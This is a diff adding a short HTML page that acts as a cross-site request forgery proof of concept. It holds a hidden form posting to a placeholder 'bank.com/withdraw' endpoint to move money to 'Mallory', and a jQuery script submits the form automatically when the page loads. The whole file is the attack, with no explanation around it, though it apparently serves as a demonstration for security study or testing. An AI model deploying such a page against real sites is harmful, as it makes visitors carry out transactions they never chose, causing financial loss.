@@ -1,0 +1,19 @@
+<html><head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+</head>
+<body>
+
+<form id="target" method="POST" action="http://bank.com/withdraw" enctype="text/plain" >
+<input type="text" name="account" value="checking"/>
+<input type="text" name="destination" value="Mallory"/>
+<input type="text" name="amount" value="$1"/>
+<input type="submit" value="POST" />
+</form>
+
+<script>
+$(document).ready(function(){$('#target').submit();});
+</script>
+
+
+</body>
+</html>
